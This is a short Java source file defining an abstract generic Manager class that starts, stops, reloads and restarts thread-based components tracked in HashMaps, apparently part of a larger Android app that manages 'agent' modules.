package com.ht.RCSAndroidGUI;

import java.util.HashMap;
import java.util.Iterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.agent.AgentBase;
import com.ht.RCSAndroidGUI.agent.AgentConf;

public abstract class Manager<T extends ThreadBase> {
	/** The running. */
	protected  HashMap<Integer, T> running;
	protected  HashMap<T, Thread> threads;
	protected Status status;
	
	public Manager(){
		status = Status.self();
	}
	
	public abstract boolean startAll();
	public abstract void stopAll() ;
	public abstract  void start( int key) ;
	public abstract  void stop( int key) ;
	
	/**
	 * Reload .
	 * 
	 * @param key
	 *            the key
	 */
	public void reload(final int key) {
		final T a = running.get(key);
		a.next();
	}
	
	/**
	 * Restart .
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void restart(final int key) {
		final T a = running.get(key);
		stop(key);
		start(key);
	}
	
	public HashMap<Integer, T> getRunning() {
		return running;
	}
}
